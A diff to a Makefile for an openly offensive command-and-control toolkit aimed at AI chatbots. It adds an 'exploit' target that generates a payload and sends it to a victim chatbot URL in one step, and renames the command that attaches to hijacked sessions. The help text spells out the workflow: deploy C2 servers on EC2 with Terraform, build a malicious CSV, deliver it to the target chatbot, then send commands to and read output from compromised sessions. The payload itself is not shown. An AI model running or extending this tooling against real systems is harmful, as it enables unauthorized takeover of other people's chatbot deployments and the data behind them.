@@ -73,7 +73,16 @@ configure-ec2:
 # C2 Commands (via Click CLI)
 # =============================================================================
 
-# Attack a target
+# Exploit: generate payload + send to victim in one step
+# Usage: make exploit (reads ../.victim_url) or make exploit TARGET=https://victim-chatbot.com
+exploit:
+	@if [ -n "$(TARGET)" ]; then \
+		uv run c2 exploit $(TARGET); \
+	else \
+		uv run c2 exploit; \
+	fi
+
+# Attack a target (sends CSV to victim, does not generate)
 # Usage: make attack TARGET=https://victim-chatbot.com
 attack:
 	@if [ -z "$(TARGET)" ]; then \
@@ -104,9 +113,9 @@ receive:
 	fi
 	uv run c2 receive -s $(SESSION)
 
-# Attach to session interactively
-# Usage: make attach (reads from .session_id) or make attach SESSION=sess_abc123
-attach:
+# Connect to session interactively
+# Usage: make connect-session (reads from .session_id) or make connect-session SESSION=sess_abc123
+connect-session:
 	@if [ -z "$(SESSION)" ] && [ -f .session_id ]; then \
 		SESSION_ID=$$(cat .session_id); \
 		echo "Using session ID from .session_id: $$SESSION_ID"; \
@@ -117,14 +126,15 @@ attach:
 		echo ""; \
 		echo "No session ID found."; \
 		echo ""; \
-		echo "Run 'make generate-csv' first, or specify manually:"; \
-		echo "  make attach SESSION=sess_abc123"; \
+		echo "Run 'make exploit' or 'make generate-csv' first, or specify manually:"; \
+		echo "  make connect-session SESSION=sess_abc123"; \
 		echo ""; \
 		exit 1; \
 	fi
 
-# Alias for backwards compatibility
-operator: attach
+# Aliases for backwards compatibility
+attach: connect-session
+operator: connect-session
 
 # Check C2 server status
 status:
@@ -198,9 +208,13 @@ help:
 	@echo "  make deploy             Deploy C2 infrastructure"
 	@echo ""
 	@echo "Attack Workflow:"
+	@echo "  make exploit            Generate payload + send to victim (reads .victim_url)"
+	@echo "  make exploit TARGET=url Override victim URL"
+	@echo "  make connect-session    Attach to C2 session interactively"
+	@echo ""
+	@echo "Individual Steps:"
 	@echo "  make generate-csv       Generate malicious CSV with payload"
 	@echo "  make attack TARGET=url  Send CSV directly to victim chatbot"
-	@echo "  make attach SESSION=x   Attach to session interactively"
 	@echo ""
 	@echo "Session Commands:"
 	@echo "  make send CMD=x SESSION=x   Send command to session"
@@ -217,6 +231,6 @@ help:
 	@echo ""
 
 .PHONY: setup terraform-init terraform-plan terraform-apply terraform-destroy \
-        deploy terraform-yolo configure-ec2 attack generate-csv send receive attach \
-        operator status logs check-dns update-dns test verify-protocol clean destroy help \
-        env-from-terraform
+        deploy terraform-yolo configure-ec2 exploit attack generate-csv send receive \
+        connect-session attach operator status logs check-dns update-dns test \
+        verify-protocol clean destroy help env-from-terraform
